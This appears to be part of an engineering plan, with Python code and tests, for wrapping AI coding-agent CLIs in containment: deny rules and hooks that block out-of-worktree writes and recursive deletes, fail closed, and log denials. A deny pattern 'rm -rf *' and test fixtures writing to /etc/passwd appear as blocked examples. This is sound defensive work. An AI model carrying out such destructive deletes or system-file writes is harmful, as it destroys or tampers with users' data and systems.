def test_apply_emits_hook_and_native_layers(tmp_path):
    req = HarnessRequest(prompt="p", cwd=str(tmp_path))
    ClaudeCodeHarness().apply_containment(POLICY, req)
    doc = json.loads(Path(_settings_path(req)).read_text(encoding="utf-8"))

    assert doc["hooks"]["PreToolUse"], "hook layer missing"
    assert doc["permissions"]["deny"], "native layer missing"


def test_native_layer_rule_also_runs_through_the_hook(tmp_path):
    """Spec section 4a: `layer` is a MINIMUM, so a native rule is ALSO
    hooked on a harness that has a hook — otherwise its denial would be
    unobservable (permission_denials is empty for native denies)."""
    req = HarnessRequest(prompt="p", cwd=str(tmp_path))
    ClaudeCodeHarness().apply_containment(POLICY, req)
    doc = json.loads(Path(_settings_path(req)).read_text(encoding="utf-8"))

    matchers = "|".join(e["matcher"] for e in doc["hooks"]["PreToolUse"])
    assert "Bash" in matchers          # the native-layer rule's tool
    assert "Write" in matchers         # the hook-layer rule's tool


def test_apply_reports_full_coverage_for_claude(tmp_path):
    req = HarnessRequest(prompt="p", cwd=str(tmp_path))
    report = ClaudeCodeHarness().apply_containment(POLICY, req)
    assert report.enabled is True
    assert report.rules_unenforceable == []
    assert set(report.rules_enforced) == {
        "no-out-of-worktree-write", "no-recursive-force-delete"}


def test_normalise_denials_reads_permission_denials():
    """Shape captured from a live 2.1.219 run."""
    stream = json.dumps({
        "type": "result", "subtype": "success", "session_id": "s",
        "permission_denials": [{
            "tool_name": "Write",
            "tool_use_id": "toolu_01",
            "tool_input": {"file_path": "C:\\\\etc\\\\passwd"},
        }],
    })
    denials = ClaudeCodeHarness().normalise_denials(stream)
    assert len(denials) == 1
    assert denials[0].tool == "Write"
    assert denials[0].layer is ContainmentLayer.HOOK
    assert denials[0].target == "C:\\etc\\passwd"


def test_normalise_denials_recovers_rule_id_from_the_hook_reason():
    stream = "\n".join([
        json.dumps({
            "type": "system", "subtype": "hook_response",
            "hook_event": "PreToolUse", "hook_name": "PreToolUse:Write",
            "exit_code": 0, "outcome": "success",
            "output": json.dumps({"hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "deny",
                "permissionDecisionReason":
                    "[no-out-of-worktree-write] Writes are scoped.",
            }}),
        }),
        json.dumps({
            "type": "result", "subtype": "success", "session_id": "s",
            "permission_denials": [{
                "tool_name": "Write", "tool_use_id": "t1",
                "tool_input": {"file_path": "/etc/passwd"}}],
        }),
    ])
    d = ClaudeCodeHarness().normalise_denials(stream)[0]
    assert d.rule_id == "no-out-of-worktree-write"
    assert d.reason == "Writes are scoped."


def test_no_denials_on_a_clean_stream():
    stream = json.dumps({"type": "result", "subtype": "success",
                         "session_id": "s", "permission_denials": []})
    assert ClaudeCodeHarness().normalise_denials(stream) == []


def _settings_path(req: HarnessRequest) -> str:
    idx = req.extra_args.index("--settings")
    return req.extra_args[idx + 1]
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_containment_adapters.py -v`
Expected: FAIL with `AttributeError: 'ClaudeCodeHarness' object has no attribute 'containment'`

- [ ] **Step 3: Add the base contract**

In `src/sdlc/harness/adapters.py`, add these imports at the top. `json` and
`os` are already imported (lines 18-19); `Path` is **not** imported at all
today, so it must be added:

```python
import sys
import tempfile
from pathlib import Path

from ..models import ContainmentLayer, ContainmentReport, ToolDenial
from .containment import Policy, Rule, target_of
```

Extend the existing `from ..models import ...` line (line 28) rather than
adding a second one.

Then, inside `class CodingHarness`, directly after `normalise_session`
(line 137-142), add:

```python
    # ADR-17: what this CLI can actually enforce. A harness declaring an
    # empty set fails closed when containment is enabled, rather than
    # running unpoliced and looking contained.
    containment: frozenset[ContainmentLayer] = frozenset()

    def apply_containment(self, policy: Policy,
                          req: HarnessRequest) -> ContainmentReport:
        """Compile `policy` into this CLI's own mechanisms, mutating `req`.
        Base default: enforce nothing and say so."""
        return ContainmentReport(
            enabled=True, layers_active=[],
            rules_unenforceable=[r.id for r in policy.rules])

    def normalise_denials(self, stdout: str) -> list[ToolDenial]:
        """Blocked tool calls from this harness's stream (ADR-17, mirroring
        normalise_session). Base default: none reported."""
        return []
```

- [ ] **Step 4: Implement the claude adapter**

Inside `class ClaudeCodeHarness`, add after `build_cmd`:

```python
    containment = frozenset({ContainmentLayer.NATIVE, ContainmentLayer.HOOK})

    def apply_containment(self, policy: Policy,
                          req: HarnessRequest) -> ContainmentReport:
        """Both layers, deliberately overlapping (spec §4a).

        `permissions.deny` is the floor a buggy hook cannot weaken (verified:
        a hook's `allow` cannot bypass a deny rule). The hook is the layer
        that is OBSERVABLE — a native deny blocks correctly but reports
        `permission_denials: []`, so every rule is ALSO hooked here.
        """
        hooks = [{
            "matcher": "|".join(sorted({t for r in policy.rules
                                        for t in r.tools})),
            "hooks": [{"type": "command", "command": self._hook_command(req)}],
        }] if policy.rules else []

        deny = [p for r in policy.rules if ContainmentLayer.NATIVE is r.layer
                for p in self._native_patterns(r)]

        doc = {"hooks": {"PreToolUse": hooks}, "permissions": {"deny": deny}}

        # OUTSIDE the worktree, always: writes inside the worktree are
        # permitted by design, so a settings file placed there is a file the
        # agent may rewrite — it could edit its own policy.
        fd, path = tempfile.mkstemp(prefix="sdlc-containment-",
                                    suffix=".json")
        with os.fdopen(fd, "w", encoding="utf-8") as fh:
            json.dump(doc, fh)

        req.extra_args = [*req.extra_args, "--settings", path,
                          "--include-hook-events"]
        return ContainmentReport(
            enabled=True,
            layers_active=[ContainmentLayer.NATIVE, ContainmentLayer.HOOK],
            rules_enforced=[r.id for r in policy.rules],
            rules_unenforceable=[])

    @staticmethod
    def _hook_command(req: HarnessRequest) -> str:
        """Absolute interpreter path: the child's PATH is allowlisted and may
        resolve a different `python` than the worker's venv. Forward slashes
        because claude runs hooks through Git Bash on Windows."""
        exe = Path(sys.executable).as_posix()
        wt = Path(req.cwd).as_posix()
        return (f'"{exe}" -m sdlc.harness.hook --worktree "{wt}"')

    @staticmethod
    def _native_patterns(rule: Rule) -> list[str]:
        """Translate OUR pattern syntax into claude's `Tool(arg)` deny form.
        The policy author never writes CLI-specific syntax."""
        out: list[str] = []
        for tool in rule.tools:
            for pat in rule.patterns:
                out.append(f"{tool}({pat})")
        return out

    def normalise_denials(self, stdout: str) -> list[ToolDenial]:
        """`result.permission_denials` is the structured spine (tool_name /
        tool_use_id / tool_input). It carries no rule id, so the rule id is
        recovered from the `[rule-id] ` prefix the hook writes into the
        reason, surfaced in `hook_response.output`."""
        reasons: list[str] = []
        denials: list[ToolDenial] = []
        for ln in stdout.strip().splitlines():
            ln = ln.strip()
            if not ln:
                continue
            try:
                ev = json.loads(ln)
            except json.JSONDecodeError:
                continue
            if (ev.get("subtype") == "hook_response"
                    and ev.get("hook_event") == "PreToolUse"):
                try:
                    hso = json.loads(ev.get("output") or "{}")
                    hso = hso.get("hookSpecificOutput") or {}
                except json.JSONDecodeError:
                    continue
                if hso.get("permissionDecision") == "deny":
                    reasons.append(hso.get("permissionDecisionReason") or "")
            elif ev.get("type") == "result":
                for i, pd in enumerate(ev.get("permission_denials") or []):
                    rule_id, reason = _split_reason(
                        reasons[i] if i < len(reasons) else "")
                    tool_input = pd.get("tool_input") or {}
                    denials.append(ToolDenial(
                        tool=pd.get("tool_name") or "unknown",
                        rule_id=rule_id, layer=ContainmentLayer.HOOK,
                        reason=reason,
                        target=target_of(pd.get("tool_name") or "",
                                         tool_input)))
        return denials
```

Add this module-level helper to `adapters.py`, beside `context_window_for`:

```python
def _split_reason(text: str) -> tuple[str, str]:
    """Split the hook's `[rule-id] reason` back apart."""
    if text.startswith("[") and "] " in text:
        rid, _, rest = text[1:].partition("] ")
        return rid, rest
    return "unknown", text
```

- [ ] **Step 5: Feed denials into the session digest**

`SessionDigest.denials` (Task 1) has no writer yet. `digest_of` counts by
event kind, so denials must reach the session as events.

In `ClaudeCodeHarness.normalise_session`, before returning the session,
append one event per denial:

```python
        # E-16: denials are part of the transcript, so the digest counts
        # them on clean-green runs too (the same reasoning as OQ-B7's
        # keep-aggregates-pre-truncation rule).
        for d in self.normalise_denials(stdout):
            session.events.append(SessionEvent(
                kind="tool_denied", tool=d.tool, target=d.target))
```

In `src/sdlc/models.py`, add `tool_denied` to the `SessionEvent.kind`
comment listing the vocabulary (lines 65-66).

In `src/sdlc/harness/session.py`, add the counter inside `digest_of`'s event
loop, beside the `compaction` branch (line 36):

```python
        elif ev.kind == "tool_denied":
            d.denials += 1
```

`tool_denied` must NOT be added to `_TOOL_KINDS` (session.py:14): a blocked
call is not a tool call that happened, and counting it in `tool_calls` would
inflate the E-36 waste aggregates.

Add to `tests/test_containment_adapters.py`:

```python
def test_denials_become_session_events_and_are_counted():
    from sdlc.harness.session import digest_of
    stream = "\n".join([
        json.dumps({"type": "system", "subtype": "init", "session_id": "s",
                    "model": "claude-opus-4-8"}),
        json.dumps({"type": "result", "subtype": "success", "session_id": "s",
                    "permission_denials": [{
                        "tool_name": "Write", "tool_use_id": "t1",
                        "tool_input": {"file_path": "/etc/passwd"}}]}),
    ])
    session = ClaudeCodeHarness().normalise_session(stream)
    assert [e.kind for e in session.events].count("tool_denied") == 1
    digest = digest_of(session)
    assert digest.denials == 1
    assert digest.tool_calls == 0      # a blocked call is not a tool call
```

- [ ] **Step 6: Run tests to verify they pass**

Run: `python -m pytest tests/test_containment_adapters.py -v`
Expected: PASS, 10 passed

- [ ] **Step 7: Run the harness suite for regressions**

Run: `python -m pytest tests/test_claude_stream_normalise.py tests/test_session_digest.py -v`
Expected: PASS. If `tests/test_session_digest.py` does not exist under that
name, run `python -m pytest tests/ -k "session or digest" -v` instead — the
`normalise_session` change touches E-38's tests.

- [ ] **Step 8: Commit**

```bash
git add src/sdlc/harness/adapters.py src/sdlc/harness/session.py src/sdlc/models.py tests/test_containment_adapters.py
git commit -m "feat(harness): containment capability + claude two-layer compile (E-15, ADR-17)"
```

---

### Task 6: opencode and cursor adapters

**Files:**
- Modify: `src/sdlc/harness/adapters.py` (`OpenCodeHarness` ~line 355; `CursorHarness` ~line 500)
- Test: `tests/test_containment_adapters_other.py`

**Interfaces:**
- Consumes: everything from Task 5
- Produces: `OpenCodeHarness.containment = {NATIVE}`, `CursorHarness.containment = frozenset()`

- [ ] **Step 1: Write the failing test**

Create `tests/test_containment_adapters_other.py`:

```python
"""E-15: the other two harnesses. Unequal capability, reported not hidden."""
import json
from pathlib import Path

from sdlc.harness.adapters import CursorHarness, HarnessRequest, OpenCodeHarness
from sdlc.harness.containment import Policy, Rule
from sdlc.models import ContainmentLayer

POLICY = Policy(version=1, rules=[
    Rule(id="hook-only", layer=ContainmentLayer.HOOK,
         tools=["Write"], predicate="path_outside_worktree",
         reason="Writes are scoped to the task worktree."),
    Rule(id="native-ok", layer=ContainmentLayer.NATIVE,
         tools=["Bash"], predicate="command_matches",
         patterns=["rm -rf *"], reason="Destructive recursive delete."),
])


def test_opencode_declares_native_only():
    """--pure disables external plugins, which are opencode's only hook
    mechanism, so the native permission block is all it has."""
    assert OpenCodeHarness().containment == frozenset({ContainmentLayer.NATIVE})


def test_opencode_reports_hook_rules_as_unenforceable(tmp_path):
    req = HarnessRequest(prompt="p", cwd=str(tmp_path))
    report = OpenCodeHarness().apply_containment(POLICY, req)
    assert report.rules_enforced == ["native-ok"]
    assert report.rules_unenforceable == ["hook-only"]
    assert report.layers_active == [ContainmentLayer.NATIVE]


def test_opencode_writes_a_permission_deny_config(tmp_path):
    req = HarnessRequest(prompt="p", cwd=str(tmp_path))
    OpenCodeHarness().apply_containment(POLICY, req)
    idx = req.extra_args.index("--config")
    doc = json.loads(Path(req.extra_args[idx + 1]).read_text(encoding="utf-8"))
    assert doc["permission"]["bash"]["rm -rf *"] == "deny"


def test_cursor_declares_no_layers():
    assert CursorHarness().containment == frozenset()


def test_cursor_reports_everything_unenforceable(tmp_path):
    req = HarnessRequest(prompt="p", cwd=str(tmp_path))
    report = CursorHarness().apply_containment(POLICY, req)
    assert report.layers_active == []
    assert set(report.rules_unenforceable) == {"hook-only", "native-ok"}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_containment_adapters_other.py -v`
Expected: FAIL — `assert frozenset() == frozenset({<ContainmentLayer.NATIVE>})`

- [ ] **Step 3: Implement the opencode adapter**

Inside `class OpenCodeHarness`, after `build_cmd`, add:

```python
    # `--pure` (build_cmd) disables external plugins, which are opencode's
    # only hook mechanism. The native permission block is what remains.
    containment = frozenset({ContainmentLayer.NATIVE})

    def apply_containment(self, policy: Policy,
                          req: HarnessRequest) -> ContainmentReport:
        perms: dict[str, dict[str, str]] = {"bash": {}}
        enforced: list[str] = []
        unenforceable: list[str] = []
        for rule in policy.rules:
            if ContainmentLayer.HOOK is rule.layer:
                unenforceable.append(rule.id)   # needs a hook we do not have
                continue
            for pat in rule.patterns:
                perms["bash"][pat] = "deny"
            enforced.append(rule.id)

        fd, path = tempfile.mkstemp(prefix="sdlc-containment-",
                                    suffix=".json")
        with os.fdopen(fd, "w", encoding="utf-8") as fh:
            json.dump({"permission": perms}, fh)

        req.extra_args = [*req.extra_args, "--config", path]
        return ContainmentReport(
            enabled=True, layers_active=[ContainmentLayer.NATIVE],
            rules_enforced=enforced, rules_unenforceable=unenforceable)
```

Cursor needs no override — the `CodingHarness` base already declares an
empty `containment` and reports every rule unenforceable. Add only a comment
inside `class CursorHarness`, after `build_cmd`:

```python
    # containment: inherits the base frozenset() — cursor-agent surfaces
    # neither a deny-config nor a hook flag, so it FAILS CLOSED when
    # containment is enabled (ADR-17). This is a deliberate, known cost:
    # cursor cells drop out of a contained benchmark sweep rather than
    # running unpoliced beside contained ones.
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `python -m pytest tests/test_containment_adapters_other.py -v`
Expected: PASS, 5 passed

- [ ] **Step 5: Verify the opencode config key against the installed CLI**

Run: `opencode --help` and confirm a `--config` flag accepting a JSON file
exists. If the flag differs, adjust `apply_containment` and the test's
`req.extra_args.index("--config")` together, and record the real flag in a
comment. Do not guess — the whole point of this layer is that it bites.

- [ ] **Step 6: Commit**

```bash
git add src/sdlc/harness/adapters.py tests/test_containment_adapters_other.py
git commit -m "feat(harness): opencode native containment; cursor fails closed (E-15)"
```

---

### Task 7: Wire containment into `run_coding_task`

**Files:**
- Modify: `src/sdlc/activities.py` (`CodingTaskInput` ~line 374; `run_coding_task` ~line 386)
- Modify: `src/sdlc/workflows/feature.py` (the `run_coding_task` call site, ~line 740)
- Test: `tests/test_containment_activity.py`

**Interfaces:**
- Consumes: everything from Tasks 1-6
- Produces: `CodingTaskInput.containment_enabled: bool`, `CodingTaskInput.containment_policy_path: str | None`, `CodingTaskInput.containment_strict: bool`; `ContainmentDisabled` exception

- [ ] **Step 1: Write the failing test**

Create `tests/test_containment_activity.py`:

```python
"""E-15: fail-closed wiring in run_coding_task."""
import pytest

from sdlc.activities import CodingTaskInput, _resolve_containment
from sdlc.harness.adapters import ClaudeCodeHarness, CursorHarness, OpenCodeHarness
from sdlc.harness.containment import ContainmentError
from sdlc.models import ContainmentLayer

POLICY_YAML = """
version: 1
rules:
  - id: hook-only
    layer: hook
    tools: [Write]
    predicate: path_outside_worktree
    reason: "Writes are scoped to the task worktree."
"""


def _policy(tmp_path):
    p = tmp_path / "containment.yaml"
    p.write_text(POLICY_YAML, encoding="utf-8")
    return str(p)


def test_disabled_returns_no_policy_and_no_report(tmp_path):
    inp = CodingTaskInput(harness=None, prompt="p", worktree=str(tmp_path))
    policy, report = _resolve_containment(ClaudeCodeHarness(), inp)
    assert policy is None
    assert report is None


def test_enabled_loads_the_policy(tmp_path):
    inp = CodingTaskInput(harness=None, prompt="p", worktree=str(tmp_path),
                          containment_enabled=True,
                          containment_policy_path=_policy(tmp_path))
    policy, report = _resolve_containment(ClaudeCodeHarness(), inp)
    assert [r.id for r in policy.rules] == ["hook-only"]
    assert report.layers_active == [ContainmentLayer.NATIVE,
                                    ContainmentLayer.HOOK]


def test_zero_layer_harness_refuses_to_start(tmp_path):
    inp = CodingTaskInput(harness=None, prompt="p", worktree=str(tmp_path),
                          containment_enabled=True,
                          containment_policy_path=_policy(tmp_path))
    with pytest.raises(ContainmentError, match="cannot enforce"):
        _resolve_containment(CursorHarness(), inp)


def test_partial_coverage_runs_but_records_the_gap(tmp_path):
    inp = CodingTaskInput(harness=None, prompt="p", worktree=str(tmp_path),
                          containment_enabled=True,
                          containment_policy_path=_policy(tmp_path))
    _, report = _resolve_containment(OpenCodeHarness(), inp)
    assert report.rules_unenforceable == ["hook-only"]


def test_strict_promotes_partial_coverage_to_a_refusal(tmp_path):
    inp = CodingTaskInput(harness=None, prompt="p", worktree=str(tmp_path),
                          containment_enabled=True, containment_strict=True,
                          containment_policy_path=_policy(tmp_path))
    with pytest.raises(ContainmentError, match="unenforceable"):
        _resolve_containment(OpenCodeHarness(), inp)


def test_missing_policy_fails_closed(tmp_path):
    inp = CodingTaskInput(harness=None, prompt="p", worktree=str(tmp_path),
                          containment_enabled=True,
                          containment_policy_path=str(tmp_path / "absent.yaml"))
    with pytest.raises(ContainmentError):
        _resolve_containment(ClaudeCodeHarness(), inp)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_containment_activity.py -v`
Expected: FAIL with `ImportError: cannot import name '_resolve_containment'`

- [ ] **Step 3: Add the fields and the resolver**

In `src/sdlc/activities.py`, add to `CodingTaskInput` after `attempt`:

```python
    # E-15/E-16 (FR-703). Flags travel; the YAML is loaded activity-side,
    # because the workflow sandbox cannot read files — same split as the
    # agent registry.
    containment_enabled: bool = False
    containment_policy_path: str | None = None
    containment_strict: bool = False
```

Add this helper above `run_coding_task`. It takes the **same**
`HarnessRequest` that will be run, so `apply_containment` is called exactly
once and the request that gets compiled is the request that gets executed:

```python
def _resolve_containment(harness, inp: CodingTaskInput,
                         req: HarnessRequest | None = None):
    """Load the policy and compile it into `req`, or fail closed.

    Returns (policy, report) — both None when containment is disabled.
    Every failure path raises: an unpoliced run that BELIEVES it is policed
    is the one outcome worse than no containment at all (ADR-17).
    """
    if not inp.containment_enabled:
        return None, None

    policy = load_policy(inp.containment_policy_path)   # raises: fail closed

    if not harness.containment:
        raise ContainmentError(
            f"containment is enabled but the {harness.kind.value} harness "
            f"cannot enforce any layer; refusing to start an unpoliced run "
            f"(ADR-17). Disable containment or choose another harness.")

    if req is None:                     # unit-test path: compile a probe
        req = HarnessRequest(prompt=inp.prompt, cwd=inp.worktree)
    report = harness.apply_containment(policy, req)

    if inp.containment_strict and report.rules_unenforceable:
        raise ContainmentError(
            f"containment_strict is set and the {harness.kind.value} harness "
            f"leaves these rules unenforceable: "
            f"{', '.join(report.rules_unenforceable)}")
    return policy, report
```

Then in `run_coding_task`, replace the `harness = HARNESSES[inp.harness]`
line and the `harness.run(...)` block with:

```python
    harness = HARNESSES[inp.harness]
    req = HarnessRequest(
        prompt=inp.prompt, cwd=inp.worktree, model=inp.model,
        session_id=inp.session_id, timeout_s=inp.timeout_s,
    )
    _, report = _resolve_containment(harness, inp, req)
    with span("harness.run", harness=inp.harness.value,
              task_id=inp.task_id, attempt=inp.attempt):
        result = await harness.run(req, heartbeat=activity.heartbeat)
    result.containment = report
    try:
        result.denials = harness.normalise_denials(result._raw_stdout)
    except Exception:                     # noqa: BLE001
        # Best-effort, exactly like capture_session: losing the RECORD of a
        # denial must never fail a task whose denial was already enforced.
        _log.warning("denial normalisation failed", exc_info=True)
```

Add the imports at the top of `activities.py`:

```python
# HarnessRequest is ALREADY imported at activities.py:30 — do not re-add it.
from .harness.containment import ContainmentError, load_policy
```

- [ ] **Step 4: Pass the flags from the workflow**

In `src/sdlc/workflows/feature.py`, at the `run_coding_task` call site
(~line 740), add the three fields to the `CodingTaskInput(...)` construction:

```python
                    containment_enabled=cfg.containment_enabled,
                    containment_policy_path=cfg.containment.policy_path,
                    containment_strict=cfg.containment.strict,
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `python -m pytest tests/test_containment_activity.py -v`
Expected: PASS, 6 passed

- [ ] **Step 6: Run the full suite**

Run: `python -m pytest -q`
Expected: no new failures. `run_coding_task`'s existing tests still pass
because containment defaults to off and the code path is unchanged.

- [ ] **Step 7: Commit**

```bash
git add src/sdlc/activities.py src/sdlc/workflows/feature.py tests/test_containment_activity.py
git commit -m "feat(activities): fail-closed containment wiring in run_coding_task (E-15/E-16)"
```

---

### Task 8: Live end-to-end proof and documentation

**Files:**
- Create: `tests/test_containment_live.py`
- Modify: `ROADMAP.md`, `PRD.md`, `ARCHITECTURE.md`
- Modify: `pyproject.toml` (register the `live` marker)

**Interfaces:**
- Consumes: everything
- Produces: no new code interfaces; the roadmap/PRD/ADR record

- [ ] **Step 1: Register the marker**

In `pyproject.toml`, extend the markers list:

```toml
markers = [
    "slow: builds a venv or otherwise takes >10s",
    "live: spawns a real harness CLI and spends tokens; skipped unless SDLC_LIVE_TESTS=1",
]
```

- [ ] **Step 2: Write the live test**

Create `tests/test_containment_live.py`:

```python
"""E-15: the one test that proves the fence actually bites.

Skipped by default — it spawns a real `claude -p` and spends tokens. The
mechanism this asserts was verified by hand against 2.1.219 during design;
this pins it so a CLI upgrade cannot silently un-contain the factory.

Run with:  SDLC_LIVE_TESTS=1 python -m pytest tests/test_containment_live.py -v
"""
import asyncio
import os
import shutil

import pytest

from sdlc.harness.adapters import ClaudeCodeHarness, HarnessRequest
from sdlc.harness.containment import load_policy

pytestmark = [
    pytest.mark.live,
    pytest.mark.skipif(os.environ.get("SDLC_LIVE_TESTS") != "1",
                       reason="set SDLC_LIVE_TESTS=1 to spend tokens"),
    pytest.mark.skipif(shutil.which("claude") is None,
                       reason="claude CLI not on PATH"),
]


def test_a_write_outside_the_worktree_is_denied_and_reported(tmp_path):
    worktree = tmp_path / "worktree"
    worktree.mkdir()
    outside = tmp_path / "outside.txt"

    harness = ClaudeCodeHarness()
    req = HarnessRequest(
        prompt=f"Write the single word HELLO into the file {outside}. "
               f"If a tool call is blocked, stop and say BLOCKED.",
        cwd=str(worktree), timeout_s=300)
    harness.apply_containment(load_policy(), req)

    result = asyncio.run(harness.run(req))

    assert not outside.exists(), "containment did not stop the write"
    denials = harness.normalise_denials(result._raw_stdout)
    assert denials, "the write was blocked but no denial was reported"
    assert denials[0].rule_id == "no-out-of-worktree-write"
```

- [ ] **Step 3: Run it live once, by hand**

Run: `SDLC_LIVE_TESTS=1 python -m pytest tests/test_containment_live.py -v`
Expected: PASS. If it fails, the containment is not real — fix the adapter
before continuing, and do not mark this task complete.

- [ ] **Step 4: Confirm it skips cleanly by default**

Run: `python -m pytest tests/test_containment_live.py -v`
Expected: 1 skipped

- [ ] **Step 5: Update `ARCHITECTURE.md` with ADR-17**

In §12, after ADR-16, add:

```markdown
- **ADR-17** Containment as a declared harness capability — a `CodingHarness`
  declares which layers it can enforce (`native` / `hook`); the policy is one
  versioned asset compiled per adapter. Native config is the **inner** layer
  and the hook the outer one, which is structural rather than conventional:
  a hook's `allow` cannot bypass a `permissions.deny` rule. Because a native
  denial is **not** structurally reported (`permission_denials` is empty for
  it) while a hook denial is, `layer:` declares a rule's *minimum* capability
  and each adapter enforces at every layer it has. Total absence of layers
  fails closed; partial coverage is recorded in `ContainmentReport`, never
  silent.
```

- [ ] **Step 6: Update `PRD.md` FR-703**

Append to the FR-703 paragraph:

```markdown
  *(Partially landed 2026-07-24, E-15/E-16: `policy/containment.yaml` +
  a `PreToolUse` hook enforce out-of-worktree writes, recursive deletes,
  agent-config rewrites, and a host allowlist, with denials recorded as
  `ToolDenial` on `HarnessRunResult`. Egress is **tool-level only** — a
  socket opened from inside an allowed `Bash` call is not visible to it.
  Network-level egress and the restricted-OS-user/container tier remain
  open under E-21.)*
```

- [ ] **Step 7: Update `ROADMAP.md`**

Make these edits:

1. §9.4 — mark E-15 and E-16 `[x]` with the spec/plan paths, matching the
   house style of E-30/E-32/E-38's landed notes.
2. §9.4 E-17 — append: *"**Blocker dissolved (2026-07-24):** claude exposes
   a `defer` permission decision — a headless session pauses at a tool call
   and resumes via `-p --resume` for the hook to re-evaluate. The escalation
   therefore never needs an activity to await a workflow signal; it reuses
   the resume handle the adapters already own."*
3. §9.4 E-18 — mark `[ ]` ⚠️ partial: tool-level egress landed, network-level
   is E-21.
4. §2 FR-703 — change to `[ ]` ⚠️ with the same partial framing; note the
   `pre_tool` hook now exists.
5. §3 NFR-5 — note the `pre_tool` clause closes; OS-user/container does not.
6. §6 — add ADR-17 as `[x]`.
7. §9.6 E-24 — note the version drift found on 2026-07-24: `adapters.py`
   pins claude `2.1.218`, installed was `2.1.219`.

- [ ] **Step 8: Run the full suite one final time**

Run: `python -m pytest -q`
Expected: all green, 1 skipped (the live test)

- [ ] **Step 9: Commit**

```bash
git add tests/test_containment_live.py pyproject.toml ROADMAP.md PRD.md ARCHITECTURE.md
git commit -m "docs: E-15/E-16 landed, ADR-17, FR-703 partial; live containment proof"
```

---

## Notes for the implementer

**Why the hook is its own module.** `python -m sdlc.cli` builds a Temporal
client in `main()`. The hook runs once per tool call, so importing Temporal,
pydantic_ai, and the workflow stack there would add seconds of latency to
every single tool the agent uses. `sdlc.harness.hook` imports only argparse,
json, sys, and `containment` (which needs yaml + pydantic). Task 4's
subprocess test exists to keep it that way.

**Why `sys.executable` and not `python`.** `build_env` (`adapters.py:67`)
gives the child an allowlisted PATH, so a bare `python` in the hook command
could resolve to a different interpreter than the worker's venv — one without
`sdlc` installed. The absolute interpreter path is captured at compile time.

**Why forward slashes in the hook command.** Claude runs hooks through Git
Bash on Windows (fixed upstream specifically because cmd.exe silently failed).
A Windows path with backslashes inside a Git Bash command string is an escape
hazard, so `Path(...).as_posix()` is not cosmetic.

**If a test seems wrong, check the spec before changing it.** Several tests
encode findings that were verified live against 2.1.219 and are easy to
"fix" into meaninglessness — particularly
`test_native_layer_rule_also_runs_through_the_hook` (spec §4a) and
`test_internal_failure_denies_never_allows`.
